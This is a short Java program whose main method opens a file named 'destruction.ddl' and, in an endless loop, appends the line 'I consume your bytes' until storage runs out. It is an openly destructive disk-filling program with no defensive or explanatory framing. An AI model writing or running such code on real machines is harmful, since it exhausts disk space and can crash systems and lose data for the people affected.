import java.io.FileWriter;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {


        FileWriter my_Writer = new FileWriter("destruction.ddl",true);



        while (true) {
            my_Writer.write("I consume your bytes\n");
        }
    }
}